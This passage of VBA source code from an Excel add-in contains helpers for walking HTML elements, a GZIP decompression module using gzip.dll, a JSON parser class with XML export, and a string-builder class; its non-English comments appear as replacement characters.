        If ChildEl.Children.Length Then AddChildrenIntoArray currIndex$, ChildEl
    Next
End Sub

Sub AddRowIntoElementsArray(ByVal ind As Single, ByRef EL As MSHTML.IHTMLElement)
    On Error Resume Next
    If EL Is Nothing Then Exit Sub
    ElementsArrayIndex = ElementsArrayIndex + 1
    'Debug.Print ind, EL.TagName, ElementsArrayIndex

    ElementsArray(ElementsArrayIndex, 1) = ind
    ElementsArray(ElementsArrayIndex, 2) = GetElementInfo(EL)
    ElementsTreeObjects.Add EL
    ElementsArray(ElementsArrayIndex, 4) = ElementsTreeObjects.Count
End Sub

Function GetElementInfo(ByRef EL As MSHTML.IHTMLElement) As String
    On Error Resume Next
    GetElementInfo = EL.TagName
    If EL.ID <> "" Then GetElementInfo = GetElementInfo & " id=""" & EL.ID & """": Exit Function
    If EL.Class <> "" Then GetElementInfo = GetElementInfo & " class=""" & EL.Class & """": Exit Function
End Function

Function SortElementsArray(SourceArr As Variant) As Variant
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim Check As Boolean, iCount As Integer, jCount As Integer, nCount As Integer
    ReDim tmpArr(UBound(SourceArr, 2)) As Variant
    Do Until Check
        Check = True
        For iCount = LBound(SourceArr, 1) To UBound(SourceArr, 1) - 1
            If Val(Replace(SourceArr(iCount, 1), ",", ".")) > Val(Replace(SourceArr(iCount + 1, 1), ",", ".")) Then
                For jCount = LBound(SourceArr, 2) To UBound(SourceArr, 2)
                    tmpArr(jCount) = SourceArr(iCount, jCount)
                    SourceArr(iCount, jCount) = SourceArr(iCount + 1, jCount)
                    SourceArr(iCount + 1, jCount) = tmpArr(jCount)
                    Check = False
                Next
            End If
        Next
    Loop
    SortElementsArray = SourceArr
End Function
Attribute VB_Name = "XX_mod_GZIP"
'---------------------------------------------------------------------------------------
' Module        : XX_mod_GZIP                    Version:
' Author        : Igor Vakhnenko                   Date: 25.04.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://www.vbforums.com/showthread.php?613302-RESOLVED-Decompress-GZip
' http://bbs.vbstreets.ru/viewtopic.php?f=1&t=56430&p=6792273
'---------------------------------------------------------------------------------------
Option Compare Text: Option Private Module

#If VBA7 Then        ' Office 2010-2016
    Public Declare PtrSafe Function InitDecompression Lib "gzip.dll" () As LongPtr
    Private Declare PtrSafe Function CreateDecompression Lib "gzip.dll" (ByRef context As LongPtr, ByVal flags As Long) As LongPtr
    Private Declare PtrSafe Function Decompress Lib "gzip.dll" (ByVal context As LongPtr, inBytes As Any, ByVal input_size As LongPtr, _
                                                                outBytes As Any, ByVal output_size As Long, ByRef input_used As Long, ByRef output_used As Long) As LongPtr
    Private Declare PtrSafe Function DestroyDecompression Lib "gzip.dll" (ByRef context As LongPtr) As LongPtr
    Private Declare PtrSafe Function ResetDecompression Lib "gzip.dll" (ByVal context As LongPtr) As LongPtr
    Private Declare PtrSafe Function SysAllocStringByteLen Lib "oleaut32" (ByVal Ptr As LongPtr, ByVal Length As Long) As LongPtr
    Private Declare PtrSafe Sub PutMem4 Lib "msvbvm60" (ByVal Ptr As LongPtr, ByVal value As LongPtr)
#Else        ' Office 2003-2007
    Public Declare Function InitDecompression Lib "gzip.dll" () As Long
    Private Declare Function CreateDecompression Lib "gzip.dll" (ByRef context As Long, ByVal flags As Long) As Long
    Private Declare Function Decompress Lib "gzip.dll" (ByVal context As Long, inBytes As Any, ByVal input_size As Long, _
                                                        outBytes As Any, ByVal output_size As Long, ByRef input_used As Long, ByRef output_used As Long) As Long
    Private Declare Function DestroyDecompression Lib "gzip.dll" (ByRef context As Long) As Long
    Private Declare Function ResetDecompression Lib "gzip.dll" (ByVal context As Long) As Long
    Private Declare Function SysAllocStringByteLen Lib "oleaut32" (ByVal Ptr As Long, ByVal Length As Long) As Long
    Private Declare Sub PutMem4 Lib "msvbvm60" (ByVal Ptr As Long, ByVal value As Long)
#End If

Public Property Get GZip(ByteString As String) As String
    #If VBA7 Then        ' Office 2010-2016
        Dim lngPos As LongPtr, lngBuffer As LongPtr, lngContext As LongPtr, lngLen As LongPtr
    #Else        ' Office 2003-2007
        Dim lngPos As Long, lngBuffer As Long, lngContext As Long, lngLen As Long
    #End If
    Dim lngInUsed As Long, lngOutUsed As Long, strBuffer As String

    ' create a buffer of 64 kB = this is much faster than Space$(32768)
    lngBuffer = SysAllocStringByteLen(0, 65536)
    PutMem4 VarPtr(strBuffer), lngBuffer
    ' initialize GZIP decompression & get handle
    InitDecompression
    CreateDecompression lngContext, 1
    ' start position & original length
    lngPos = StrPtr(ByteString)
    lngLen = LenB(ByteString)
    ' do decompression while success
    Do While 0 = Decompress(lngContext, ByVal lngPos, lngLen, ByVal lngBuffer, LenB(strBuffer), lngInUsed, lngOutUsed)
        ' did we get any data?
        If lngOutUsed Then
            ' create final output string (note: String = String & String = performance bottleneck)
            GZip = GZip & StrConv(LeftB$(strBuffer, lngOutUsed), vbUnicode)
        End If
        ' reduce amount of data processed
        lngLen = lngLen - lngInUsed
        ' exit loop if nothing more to do
        If lngLen < 1 Then Exit Do
        ' move pointer
        lngPos = lngPos + lngInUsed
    Loop
    ' we are done, close decompression handle
    ResetDecompression lngContext
    DestroyDecompression lngContext
    
    ' |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|?
    
End Property

Private Sub gzip_test() ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 10 |fffd||fffd| |fffd||fffd| 1000 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| GZip
    'On Error Resume Next
    s$ = "123456789"
    For i = 1 To 1000
        txt = GZip(s$)
    Next
End Sub

Function Install_GZIP(Optional ByVal Silent As Boolean = False) As Boolean     ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| gzip |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    If Install_DLL("gzip.dll", Silent) Then
        Err.Clear: InitDecompression
        Install_GZIP = Err.Number = 0
    End If
End Function

Function DecompressGZIP(ByteString As String) As String
    On Error Resume Next
    If Install_GZIP Then
        DecompressGZIP = DecodeUTF8(GZip(ByteString))
    Else
        DecompressGZIP = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GZIP: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| gzip.dll |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Function

Private Sub test_GZIP()
    On Error Resume Next
    RequestURL$ = "http://ExcelVBA.ru/"
    'RequestURL$ = "http://www.cpearson.com/"
    'RequestURL$ = "https://www.dns-shop.ru/catalog/17a8a05316404e77/planshety/?p=6&i=1"
    With http
        .Open "GET", RequestURL$, True
        .SetRequestHeader "Accept-Encoding", "gzip, deflate"
        '.SetRequestHeader "Accept-Encoding", "br"
        .Send
        If Not .WaitForResponse(4) Then
            Debug.Print "timeout"
        Else
            txt = GetResponse(.ResponseBody, "utf-8")    '
            res = GZip(.ResponseBody)
            'res = ChangeTextCharset(res, "utf-8", "windows-1251")
            res = DecodeUTF8(res)
            txt = .ResponseText
            Debug.Print "pos=", InStr(txt, Chr$(8) & Chr$(0)), Len(txt)
            'For i = 1 To 30
            'Debug.Print i, Asc(Mid$(txt, i, 1))
            'Next
            MsgBox txt
            MsgBox Left(res, 800) & vbNewLine & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & Right(res, 200)
        End If
    End With
End Sub
Attribute VB_Name = "cJSONparser"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
' VBJSON is a VB6 adaptation of the VBA JSON project at http://code.google.com/p/vba-json/
' Some bugs fixed, speed improvements added for VB6 by Michael Glaser (vbjson@ediy.co.nz)
' BSD Licensed

' Export to XML function added by EducatedFool (http://ExcelVBA.ru/)

Option Explicit

Const INVALID_JSON As Long = 1
Const INVALID_OBJECT As Long = 2
Const INVALID_ARRAY As Long = 3
Const INVALID_BOOLEAN As Long = 4
Const INVALID_NULL As Long = 5
Const INVALID_KEY As Long = 6
Const INVALID_RPC_CALL As Long = 7

Private psErrors As String

Public Function GetParserErrors() As String
    GetParserErrors = psErrors
End Function

Public Function ClearParserErrors() As String
    psErrors = ""
End Function

Public Function ToXML(ByRef txt As String) As String
    ' |fffd| 2014 EducatedFool
    Dim XML As Object, node As Object, v As Variant, k As Variant, JSONobject As Object
    
    On Error Resume Next
    Set JSONobject = Me.Parse(txt)
    If Not IsObject(JSONobject) Then
        ToXML = GetParserErrors
        Exit Function
    End If
    
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='utf-8'")
        Set node = .appendChild(.createElement("root"))
        
        ConvertToXML JSONobject, node
        ToXML = .XML
    End With
End Function

Function ConvertToXML(ByRef obj As Variant, ByRef node As Object, Optional ByVal key As Variant = "", Optional ByVal lvl As Long)
    ' |fffd| 2014 EducatedFool
    On Error Resume Next
    Dim k As Variant, item As Variant, txt$, subnode As Object, cnt&, XMLkey$
    XMLkey$ = key: If key Like "#*" Then XMLkey$ = "qq_" & key
    
    Select Case TypeName(obj)
        
        Case "Collection"
            For Each item In obj
                cnt& = cnt& + 1
                Set subnode = node.appendChild(node.OwnerDocument.createElement(IIf(key = "", "item" & (lvl + 1), XMLkey$)))
                subnode.Attributes.setNamedItem(node.OwnerDocument.createAttribute("index")).text = cnt&
                ConvertToXML item, subnode, , lvl + 1
                Set subnode = Nothing
            Next
            If cnt& = 0 Then ConvertToXML "", node.appendChild(node.OwnerDocument.createElement(XMLkey$))
            
        Case "Dictionary"
            Set subnode = node
            If Len(key) Then Set subnode = node.appendChild(node.OwnerDocument.createElement(XMLkey$))
            For Each key In obj.Keys
                ConvertToXML obj(key), subnode, key
            Next
            
        Case Else
            txt$ = "": If Not IsNull(obj) Then txt$ = obj
            If key Like "@?*" Then
                node.Attributes.setNamedItem(node.OwnerDocument.createAttribute(Mid(key, 2))).text = txt$
            Else
                Set subnode = node
                If node.BaseName <> key And Len(key) > 0 Then Set subnode = node.appendChild(node.OwnerDocument.createElement(XMLkey$))
                subnode.text = txt$
                Set subnode = Nothing
            End If
    End Select
End Function

'
'   parse txting and create JSON object
'
Public Function Parse(ByRef txt As String) As Object
    
    Dim Index As Long
    Index = 1
    psErrors = ""
    On Error Resume Next
    Call skipChar(txt, Index)
    Select Case Mid(txt, Index, 1)
        Case "{"
            Set Parse = parseObject(txt, Index)
        Case "["
            Set Parse = parseArray(txt, Index)
        Case Else
            psErrors = "Invalid JSON"
    End Select
End Function

'
'   parse collection of key/value
'
Private Function parseObject(ByRef txt As String, ByRef Index As Long) As Dictionary
    
    Set parseObject = New Dictionary
    Dim sKey As String
    
    ' "{"
    Call skipChar(txt, Index)
    If Mid(txt, Index, 1) <> "{" Then
        psErrors = psErrors & "Invalid Object at position " & Index & " : " & Mid(txt, Index) & vbCrLf
        Exit Function
    End If
    
    Index = Index + 1
    
    Do
        Call skipChar(txt, Index)
        
        If "}" = Mid(txt, Index, 1) Then
            Index = Index + 1
            Exit Do
        ElseIf "," = Mid(txt, Index, 1) Then
            Index = Index + 1
            Call skipChar(txt, Index)
            
            If "}" = Mid(txt, Index, 1) Then ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 30,11,2019
                Index = Index + 1
                Exit Do
            End If
            
        ElseIf Index > Len(txt) Then
            psErrors = psErrors & "Missing '}': " & Right(txt, 20) & vbCrLf
            Exit Do
        End If
        
        
        ' add key/value pair
        sKey = parseKey(txt, Index)
        On Error Resume Next: Err.Clear
        
        parseObject.Add sKey, parseValue(txt, Index)
        If Err.Number <> 0 Then
            psErrors = psErrors & Err.Description & ": " & sKey & vbCrLf
            Exit Do
        End If
    Loop
eh:
    
End Function

'
'   parse list
'
Private Function parseArray(ByRef txt As String, ByRef Index As Long) As Collection
    
    Set parseArray = New Collection
    
    ' "["
    Call skipChar(txt, Index)
    If Mid(txt, Index, 1) <> "[" Then
        psErrors = psErrors & "Invalid Array at position " & Index & " : " + Mid(txt, Index, 20) & vbCrLf
        Exit Function
    End If
    
    Index = Index + 1
    
    Do
        
        Call skipChar(txt, Index)
        If "]" = Mid(txt, Index, 1) Then
            Index = Index + 1
            Exit Do
        ElseIf "," = Mid(txt, Index, 1) Then
            Index = Index + 1
            Call skipChar(txt, Index)
        ElseIf Index > Len(txt) Then
            psErrors = psErrors & "Missing ']': " & Right(txt, 20) & vbCrLf
            Exit Do
        End If
        
        ' add value
        On Error Resume Next: Err.Clear
        parseArray.Add parseValue(txt, Index)
        If Err.Number <> 0 Then
            psErrors = psErrors & Err.Description & ": " & Mid(txt, Index, 20) & vbCrLf
            Exit Do
        End If
    Loop
    
End Function

'
'   parse txting / number / object / array / true / false / null
'
Private Function parseValue(ByRef txt As String, ByRef Index As Long)
    
    Call skipChar(txt, Index)
    
    Select Case Mid(txt, Index, 1)
        Case "{"
            Set parseValue = parseObject(txt, Index)
        Case "["
            Set parseValue = parseArray(txt, Index)
        Case """", "'"
            parseValue = ParseString(txt, Index)
        Case "t", "f"
            parseValue = parseBoolean(txt, Index)
        Case "n"
            parseValue = parseNull(txt, Index)
        Case Else
            parseValue = parseNumber(txt, Index)
    End Select
    
End Function

'
'   parse txting
'
Private Function ParseString(ByRef txt As String, ByRef Index As Long) As String
    
    Dim quote As String
    Dim char As String
    Dim code As String
    
    Dim SB As New cStringBuilder
    
    Call skipChar(txt, Index)
    quote = Mid(txt, Index, 1)
    Index = Index + 1
    
    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        Select Case (char)
            Case "\"
                Index = Index + 1
                char = Mid(txt, Index, 1)
                Select Case (char)
                    Case """", "\", "/", "'"
                        SB.Append char
                        Index = Index + 1
                    Case "b"
                        SB.Append vbBack
                        Index = Index + 1
                    Case "f"
                        SB.Append vbFormFeed
                        Index = Index + 1
                    Case "n"
                        SB.Append vbLf
                        Index = Index + 1
                    Case "r"
                        SB.Append vbCr
                        Index = Index + 1
                    Case "t"
                        SB.Append vbTab
                        Index = Index + 1
                    Case "u"
                        Index = Index + 1
                        code = Mid(txt, Index, 4)
                        SB.Append ChrW(Val("&h" + code))
                        Index = Index + 4
                End Select
            Case quote
                Index = Index + 1
                
                ParseString = SB.toString
                Set SB = Nothing
                
                Exit Function
                
            Case Else
                SB.Append char
                Index = Index + 1
        End Select
    Loop
    
    ParseString = SB.toString
    Set SB = Nothing
    
End Function

'
'   parse number
'
Private Function parseNumber(ByRef txt As String, ByRef Index As Long)
    On Error Resume Next: Err.Clear
    Dim value As String, char As String
    Call skipChar(txt, Index)
    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        If InStr("+-0123456789.eE", char) Then
            value = value & char
            Index = Index + 1
        Else
            parseNumber = Replace(CDec(Replace(value, ".", Mid(1 / 2, 2, 1))), Mid(1 / 2, 2, 1), ".")
            Exit Function
        End If
    Loop
End Function

'
'   parse true / false
'
Private Function parseBoolean(ByRef txt As String, ByRef Index As Long) As Boolean
    
    Call skipChar(txt, Index)
    If Mid(txt, Index, 4) = "true" Then
        parseBoolean = True
        Index = Index + 4
    ElseIf Mid(txt, Index, 5) = "false" Then
        parseBoolean = False
        Index = Index + 5
    Else
        psErrors = psErrors & "Invalid Boolean at position " & Index & " : " & Mid(txt, Index) & vbCrLf
    End If
    
End Function

'
'   parse null
'
Private Function parseNull(ByRef txt As String, ByRef Index As Long)
    
    Call skipChar(txt, Index)
    If Mid(txt, Index, 4) = "null" Then
        parseNull = Null
        Index = Index + 4
    Else
        psErrors = psErrors & "Invalid null value at position " & Index & " : " & Mid(txt, Index) & vbCrLf
    End If
    
End Function

Private Function parseKey(ByRef txt As String, ByRef Index As Long) As String
    
    Dim DQUOTE As Boolean
    Dim squote As Boolean
    Dim char As String
    
    Call skipChar(txt, Index)
    Do While Index > 0 And Index <= Len(txt)
        char = Mid(txt, Index, 1)
        Select Case (char)
            Case """"
                DQUOTE = Not DQUOTE
                Index = Index + 1
                If Not DQUOTE Then
                    Call skipChar(txt, Index)
                    If Mid(txt, Index, 1) <> ":" Then
                        psErrors = psErrors & "Invalid Key at position " & Index & " : " & parseKey & vbCrLf
                        Exit Do
                    End If
                End If
            Case "'"
                squote = Not squote
                Index = Index + 1
                If Not squote Then
                    Call skipChar(txt, Index)
                    If Mid(txt, Index, 1) <> ":" Then
                        psErrors = psErrors & "Invalid Key at position " & Index & " : " & parseKey & vbCrLf
                        Exit Do
                    End If
                End If
            Case ":"
                Index = Index + 1
                If Not DQUOTE And Not squote Then
                    Exit Do
                Else
                    parseKey = parseKey & char
                End If
            Case Else
                If InStr(vbCrLf & vbCr & vbLf & vbTab & " ", char) Then
                Else
                    parseKey = parseKey & char
                End If
                Index = Index + 1
        End Select
    Loop
    
End Function

'
'   skip special character
'
Private Sub skipChar(ByRef txt As String, ByRef Index As Long)
    Dim bComment As Boolean
    Dim bStartComment As Boolean
    Dim bLongComment As Boolean
    Do While Index > 0 And Index <= Len(txt)
        Select Case Mid(txt, Index, 1)
            Case vbCr, vbLf
                If Not bLongComment Then
                    bStartComment = False
                    bComment = False
                End If
                
            Case vbTab, " ", "(", ")"
                
            Case "/"
                If Not bLongComment Then
                    If bStartComment Then
                        bStartComment = False
                        bComment = True
                    Else
                        bStartComment = True
                        bComment = False
                        bLongComment = False
                    End If
                Else
                    If bStartComment Then
                        bLongComment = False
                        bStartComment = False
                        bComment = False
                    End If
                End If
                
            Case "*"
                If bStartComment Then
                    bStartComment = False
                    bComment = True
                    bLongComment = True
                Else
                    bStartComment = True
                End If
                
            Case Else
                If Not bComment Then
                    Exit Do
                End If
        End Select
        
        Index = Index + 1
    Loop
    
End Sub

Public Function toString(ByRef obj As Variant) As String
    Dim SB As New cStringBuilder
    Select Case VarType(obj)
        Case vbNull
            SB.Append "null"
        Case vbDate
            SB.Append """" & CStr(obj) & """"
        Case vbString
            SB.Append """" & Encode(obj) & """"
        Case vbObject
            
            Dim bFI As Boolean
            Dim i As Long
            
            bFI = True
            If TypeName(obj) = "Dictionary" Then
                
                SB.Append "{"
                Dim Keys
                Keys = obj.Keys
                For i = 0 To obj.Count - 1
                    If bFI Then bFI = False Else SB.Append ","
                    Dim key
                    key = Keys(i)
                    SB.Append """" & key & """:" & toString(obj.item(key))
                Next i
                SB.Append "}"
                
            ElseIf TypeName(obj) = "Collection" Then
                
                SB.Append "["
                Dim value
                For Each value In obj
                    If bFI Then bFI = False Else SB.Append ","
                    SB.Append toString(value)
                Next value
                SB.Append "]"
                
            End If
        Case vbBoolean
            If obj Then SB.Append "true" Else SB.Append "false"
        Case vbVariant, vbArray, vbArray + vbVariant
            Dim sEB
            SB.Append multiArray(obj, 1, "", sEB)
        Case Else
            SB.Append Replace(obj, ",", ".")
    End Select
    
    toString = SB.toString
    Set SB = Nothing
    
End Function

Private Function Encode(txt) As String
    
    Dim SB As New cStringBuilder
    Dim i As Long
    Dim j As Long
    Dim aL1 As Variant
    Dim aL2 As Variant
    Dim c As String
    Dim p As Boolean
    
    aL1 = Array(&H22, &H5C, &H2F, &H8, &HC, &HA, &HD, &H9)
    aL2 = Array(&H22, &H5C, &H2F, &H62, &H66, &H6E, &H72, &H74)
    For i = 1 To Len(txt)
        p = True
        c = Mid(txt, i, 1)
        For j = 0 To 7
            If c = Chr(aL1(j)) Then
                SB.Append "\" & Chr(aL2(j))
                p = False
                Exit For
            End If
        Next
        
        If p Then
            Dim a
            a = AscW(c)
            If a > 31 And a < 127 Then
                SB.Append c
            ElseIf a > -1 Or a < 65535 Then
                SB.Append "\u" & String(4 - Len(Hex(a)), "0") & Hex(a)
            End If
        End If
    Next
    
    Encode = SB.toString
    Set SB = Nothing
    
End Function

Private Function multiArray(aBD, iBC, sPS, ByRef sPT)        ' Array BoDy, Integer BaseCount, String PoSition
    
    Dim iDU As Long
    Dim iDL As Long
    Dim i As Long
    
    On Error Resume Next
    iDL = LBound(aBD, iBC)
    iDU = UBound(aBD, iBC)
    
    Dim SB As New cStringBuilder
    
    Dim sPB1, sPB2        ' String PointBuffer1, String PointBuffer2
    If Err.Number = 9 Then
        sPB1 = sPT & sPS
        For i = 1 To Len(sPB1)
            If i <> 1 Then sPB2 = sPB2 & ","
            sPB2 = sPB2 & Mid(sPB1, i, 1)
        Next
        '        multiArray = multiArray & toString(Eval("aBD(" & sPB2 & ")"))
        SB.Append toString(aBD(sPB2))
    Else
        sPT = sPT & sPS
        SB.Append "["
        For i = iDL To iDU
            SB.Append multiArray(aBD, iBC + 1, i, sPT)
            If i < iDU Then SB.Append ","
        Next
        SB.Append "]"
        sPT = Left(sPT, iBC - 2)
    End If
    Err.Clear
    multiArray = SB.toString
    
    Set SB = Nothing
End Function

' Miscellaneous JSON functions

Public Function StringToJSON(st As String) As String
    
    Const FIELD_SEP = "~"
    Const RECORD_SEP = "|"
    
    Dim sFlds As String
    Dim sRecs As New cStringBuilder
    Dim lRecCnt As Long
    Dim lFld As Long
    Dim fld As Variant
    Dim Rows As Variant
    
    lRecCnt = 0
    If st = "" Then
        StringToJSON = "null"
    Else
        Rows = Split(st, RECORD_SEP)
        For lRecCnt = LBound(Rows) To UBound(Rows)
            sFlds = ""
            fld = Split(Rows(lRecCnt), FIELD_SEP)
            For lFld = LBound(fld) To UBound(fld) Step 2
                sFlds = (sFlds & IIf(sFlds <> "", ",", "") & """" & fld(lFld) & """:""" & toUnicode(fld(lFld + 1) & "") & """")
            Next        'fld
            sRecs.Append IIf((Trim(sRecs.toString) <> ""), "," & vbCrLf, "") & "{" & sFlds & "}"
        Next        'rec
        StringToJSON = ("( {""Records"": [" & vbCrLf & sRecs.toString & vbCrLf & "], " & """RecordCount"":""" & lRecCnt & """ } )")
    End If
End Function


'Public Function RStoJSON(rs As ADODB.Recordset) As String
'   On Error GoTo errHandler
'   Dim sFlds As String
'   Dim sRecs As New cStringBuilder
'   Dim lRecCnt As Long
'   Dim fld As ADODB.Field
'
'   lRecCnt = 0
'   If rs.State = adStateClosed Then
'      RStoJSON = "null"
'   Else
'      If rs.EOF Or rs.BOF Then
'         RStoJSON = "null"
'      Else
'         Do While Not rs.EOF And Not rs.BOF
'            lRecCnt = lRecCnt + 1
'            sFlds = ""
'            For Each fld In rs.Fields
'               sFlds = (sFlds & IIf(sFlds <> "", ",", "") & """" & fld.Name & """:""" & toUnicode(fld.Value & "") & """")
'            Next 'fld
'            sRecs.Append IIf((Trim(sRecs.toString) <> ""), "," & vbCrLf, "") & "{" & sFlds & "}"
'            rs.MoveNext
'         Loop
'         RStoJSON = ("( {""Records"": [" & vbCrLf & sRecs.toString & vbCrLf & "], " & """RecordCount"":""" & lRecCnt & """ } )")
'      End If
'   End If
'
'   Exit Function
'errHandler:
'
'End Function

'Public Function JsonRpcCall(url As String, methName As String, args(), Optional user As String, Optional pwd As String) As Object
'    Dim r As Object
'    Dim cli As Object
'    Dim pText As String
'    Static reqId As Integer
'
'    reqId = reqId + 1
'
'    Set r = CreateObject("Scripting.Dictionary")
'    r("jsonrpc") = "2.0"
'    r("method") = methName
'    r("params") = args
'    r("id") = reqId
'
'    pText = toString(r)
'
'    Set cli = CreateObject("MSXML2.XMLHTTP.6.0")
'   ' Set cli = New MSXML2.XMLHTTP60
'    If Len(user) > 0 Then   ' If Not IsMissing(user) Then
'        cli.Open "POST", url, False, user, pwd
'    Else
'        cli.Open "POST", url, False
'    End If
'    cli.setRequestHeader "Content-Type", "application/json"
'    cli.Send pText
'
'    If cli.Status <> 200 Then
'        Err.Raise vbObjectError + INVALID_RPC_CALL + cli.Status, , cli.statusText
'    End If
'
'    Set r = parse(cli.responseText)
'    Set cli = Nothing
'
'    If r("id") <> reqId Then Err.Raise vbObjectError + INVALID_RPC_CALL, , "Bad Response id"
'
'    If r.Exists("error") Or Not r.Exists("result") Then
'        Err.Raise vbObjectError + INVALID_RPC_CALL, , "Json-Rpc Response error: " & r("error")("message")
'    End If
'
'    If Not r.Exists("result") Then Err.Raise vbObjectError + INVALID_RPC_CALL, , "Bad Response, missing result"
'
'    Set JsonRpcCall = r("result")
'End Function




Public Function toUnicode(txt As String) As String
    
    Dim X As Long
    Dim uStr As New cStringBuilder
    Dim uChrCode As Integer
    
    For X = 1 To Len(txt)
        uChrCode = Asc(Mid(txt, X, 1))
        Select Case uChrCode
            Case 8:        ' backspace
                uStr.Append "\b"
            Case 9:        ' tab
                uStr.Append "\t"
            Case 10:        ' line feed
                uStr.Append "\n"
            Case 12:        ' formfeed
                uStr.Append "\f"
            Case 13:        ' carriage return
                uStr.Append "\r"
            Case 34:        ' quote
                uStr.Append "\"""
            Case 39:        ' apotxtophe
                uStr.Append "\'"
            Case 92:        ' backslash
                uStr.Append "\\"
            Case 123, 125:        ' "{" and "}"
                uStr.Append ("\u" & Right("0000" & Hex(uChrCode), 4))
            Case Is < 32, Is > 127:        ' non-ascii characters
                uStr.Append ("\u" & Right("0000" & Hex(uChrCode), 4))
            Case Else
                uStr.Append Chr$(uChrCode)
        End Select
    Next
    toUnicode = uStr.toString
    Exit Function
    
End Function

Private Sub Class_Initialize()
    psErrors = ""
End Sub

Attribute VB_Name = "cStringBuilder"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

' ======================================================================================
' Name:     vbAccelerator cStringBuilder
' Author:   Steve McMahon (steve@vbaccelerator.com)
' Date:     1 January 2002
'
' Copyright |fffd| 2002 Steve McMahon for vbAccelerator
' --------------------------------------------------------------------------------------
' Visit vbAccelerator - advanced free source code for VB programmers
' http://vbaccelerator.com
' --------------------------------------------------------------------------------------
'
' VB can be slow to append strings together because of the continual
' reallocation of string size.  This class pre-allocates a string in
' blocks and hence removes the performance restriction.
'
' Quicker insert and remove is also possible since string space does
' not have to be reallocated.
'
' Example:
' Adding "http://vbaccelerator.com/" 10,000 times to a string:
' Standard VB:   34s
' This Class:    0.35s
'
' ======================================================================================

#If Win64 Then
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
#Else
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
#End If


Private m_sString As String
Private m_iChunkSize As Long
Private m_iPos As Long
Private m_iLen As Long

Public Property Get Length() As Long
    Length = m_iPos \ 2
End Property

Public Property Get Capacity() As Long
    Capacity = m_iLen \ 2
End Property

Public Property Get ChunkSize() As Long
    ' Return the unicode character chunk size:
    ChunkSize = m_iChunkSize \ 2
End Property

Public Property Let ChunkSize(ByVal iChunkSize As Long)
    ' Set the chunksize.  We multiply by 2 because internally
    ' we are considering bytes:
    m_iChunkSize = iChunkSize * 2
End Property

Public Property Get toString() As String
    ' The internal string:
    If m_iPos > 0 Then
        toString = Left$(m_sString, m_iPos \ 2)
    End If
End Property

Public Property Let TheString(ByRef sThis As String)
    Dim lLen As Long

    ' Setting the string:
    lLen = LenB(sThis)
    If lLen = 0 Then
        'Clear
        m_sString = ""
        m_iPos = 0
        m_iLen = 0
    Else
        If m_iLen < lLen Then
            ' Need to expand string to accommodate:
            Do
                m_sString = m_sString & Space$(m_iChunkSize \ 2)
                m_iLen = m_iLen + m_iChunkSize
            Loop While m_iLen < lLen
        End If
        CopyMemory ByVal StrPtr(m_sString), ByVal StrPtr(sThis), lLen
        m_iPos = lLen
    End If

End Property

Public Sub Clear()
    m_sString = ""
    m_iPos = 0
    m_iLen = 0
End Sub

Public Sub AppendNL(ByRef sThis As String)
    Append sThis
    Append vbCrLf
End Sub

Public Sub Append(ByRef sThis As String)
    Dim lLen As Long
    Dim lLenPlusPos As Long

    ' Append an item to the string:
    lLen = LenB(sThis)
    lLenPlusPos = lLen + m_iPos
    If lLenPlusPos > m_iLen Then
        Dim lTemp As Long

        lTemp = m_iLen
        Do While lTemp < lLenPlusPos
            lTemp = lTemp + m_iChunkSize
        Loop

        m_sString = m_sString & Space$((lTemp - m_iLen) \ 2)
        m_iLen = lTemp
    End If

